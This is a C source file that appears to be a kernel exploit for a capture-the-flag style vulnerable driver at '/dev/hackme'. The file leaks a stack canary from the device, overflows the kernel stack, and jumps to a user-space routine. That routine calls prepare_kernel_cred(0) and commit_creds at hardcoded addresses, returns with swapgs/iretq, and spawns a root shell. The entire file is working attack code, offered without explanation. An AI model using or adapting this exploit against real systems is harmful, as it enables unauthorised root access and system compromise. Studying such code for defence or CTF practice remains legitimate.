#include <stdio.h>
#include <fcntl.h>

/*
0xffffffff814c6410 T commit_creds 
0xffffffff814c67f0 T prepare_kernel_cred 
*/
unsigned long user_sp, user_cs, user_ss, user_rflags;
void save_user_land()
{
	__asm__(
		".intel_syntax noprefix;"
		"mov user_cs, cs;"
		"mov user_sp, rsp;"
		"mov user_ss, ss;"
		"pushf;"
		"pop user_rflags;"
		".att_syntax;"
	);
	puts("[*] Saved userland registers");
	printf("[#] cs: 0x%lx \n", user_cs);
	printf("[#] ss: 0x%lx \n", user_ss);
	printf("[#] rsp: 0x%lx \n", user_sp);
	printf("[#] rflags: 0x%lx \n\n", user_rflags);
}

void backdoor()
{
	printf("****getshell****");
	system("id");
	system("/bin/sh");
}

unsigned long user_rip = (unsigned long)backdoor;

void lpe()
{
	__asm(
		".intel_syntax noprefix;"
		"movabs rax, 0xffffffff814c67f0;" //prepare_kernel_cred
		"xor rdi, rdi;"
		"call rax;" //prepare_kernel_cred(0);
		"mov rdi, rax;"
		"mov rax, 0xffffffff814c6410;"
		"call rax;"
		"swapgs;"	
		"mov r15, user_ss;"
		"push r15;"
		"mov r15, user_sp;"
		"push r15;"
		"mov r15, user_rflags;"
		"push r15;"
		"mov r15, user_cs;"
		"push r15;"
		"mov r15, user_rip;"
		"push r15;"
		"iretq;"
		".att_syntax;"
	);
}

int main()
{
	unsigned int i, index = 0;
	int fd = open("/dev/hackme", O_RDWR);
	unsigned long buf[256];
	read(fd, buf, 8*11);
	for(i = 0; i < 11; i++)
		printf("i:%d:data:0x%lx\n",i, buf[i]);
	unsigned long canary = buf[2];
	unsigned long leak_addr = buf[10];
	save_user_land();
	unsigned long payload[256];
	for(i = 0; i < (16); i ++)
		payload[index++] = 0;
	payload[index++] = canary;
	payload[index++] = 0;
	payload[index++] = 0;
	payload[index++] = 0;
	payload[index++] = (unsigned long)lpe;
	write(fd, payload, index * 8);
	return 0;
}
